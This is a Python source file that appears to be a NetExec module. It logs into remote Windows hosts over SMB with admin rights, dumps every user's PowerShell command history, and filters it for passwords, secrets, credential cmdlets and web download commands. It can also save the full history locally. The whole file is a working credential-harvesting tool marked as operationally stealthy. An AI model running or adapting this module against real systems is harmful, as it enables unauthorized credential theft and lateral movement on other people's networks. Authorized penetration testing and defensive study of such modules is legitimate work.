import traceback
import os


class NXCModule:
    """Module by @357384n"""

    name = "powershell_history"
    description = "Extracts PowerShell history for all users and looks for sensitive commands."
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """To export all the history you can add the following option: -o export=enable"""
        context.log.info(f"Received module options: {module_options}")
        self.export = module_options.get("EXPORT", "disable").lower()
        context.log.info(f"Option export set to: {self.export}")

    def analyze_history(self, history):
        """Analyze PowerShell history for sensitive information."""
        sensitive_keywords = [
            "password", "passwd", "secret", "credential", "key",
            "get-credential", "convertto-securestring", "set-localuser",
            "new-localuser", "set-adaccountpassword", "new-object system.net.webclient",
            "invoke-webrequest", "invoke-restmethod"
        ]
        sensitive_commands = []
        for command in history:
            command_lower = command.lower()
            if any(keyword.lower() in command_lower for keyword in sensitive_keywords):
                sensitive_commands.append(command.strip())
        return sensitive_commands

    def on_admin_login(self, context, connection):
        """Main function to retrieve and analyze PowerShell history."""
        try:
            context.log.info("Retrieving PowerShell history...")
            command = 'powershell.exe "type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"'
            history = connection.execute(command, True).split("\n")
            if history:
                sensitive_commands = self.analyze_history(history)
                if sensitive_commands:
                    context.log.highlight("Sensitive commands found in PowerShell history:")
                    for command in sensitive_commands:
                        context.log.highlight(f"  {command}")
                else:
                    context.log.info("No sensitive commands found in PowerShell history.")
            else:
                context.log.info("No PowerShell history found.")

            # Check if export is enabled
            context.log.info(f"Export option is set to: {self.export}")
            if self.export == "enable":
                host = connection.host  # Assuming 'host' contains the target IP or hostname
                filename = f"{host}.powershell_history.txt"
                context.log.info(f"Export enabled, writing history to {filename}")
                try:
                    with open(filename, "w") as file:
                        for cmd in history:
                            file.write(cmd + "\n")
                    context.log.info(f"History written to {filename}")
                    # Print the full path to the file
                    full_path = os.path.abspath(filename)
                    print(f"PowerShell history written to: {full_path}")
                except Exception as e:
                    context.log.fail(f"Failed to write history to {filename}: {e}")

        except Exception as e:
            context.log.fail(f"UNEXPECTED ERROR: {e}")
            context.log.debug(traceback.format_exc())
